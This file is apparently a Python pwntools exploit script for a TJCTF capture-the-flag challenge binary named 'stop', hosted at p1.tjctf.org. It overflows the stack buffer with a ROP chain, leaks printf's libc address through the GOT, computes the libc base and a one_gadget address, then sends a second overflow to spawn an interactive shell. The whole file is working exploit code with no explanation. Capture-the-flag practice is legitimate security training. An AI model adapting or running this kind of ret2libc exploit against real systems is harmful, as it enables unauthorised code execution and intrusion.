from pwn import *

def exploit():
    # p = process("./stop")
    p = remote("p1.tjctf.org", 8001)
    binary = ELF("./stop")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)
    pop_rdi = 0x0000000000400953
    main = binary.symbols['main']
    ret = 0x000000000040056e
    got_printf = binary.got['printf']
    plt_printf = binary.plt['printf']

    p.sendline("A")

    payload = ''
    payload += 'A' * 0x118
    payload += p64(pop_rdi)
    payload += p64(got_printf)
    payload += p64(ret)
    payload += p64(plt_printf)
    payload += p64(ret)
    payload += p64(main)

    # gdb.attach(p, 'b *0x00000000004008d1')
    p.sendline(payload)

    p.recvuntil("yet\n")
    libc_leak = u64(p.recvuntil("W")[:-1].ljust(8, "\x00"))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - 0x064e80
    log.info("Libc base : {}".format(hex(libc.address)))
    one_gadget = libc.address + 0x4f2c5
    log.info("One gadget : {}".format(hex(one_gadget)))

    p.sendline('A')
    
    payload = ''
    payload += 'A' * 0x118
    payload += p64(one_gadget)

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()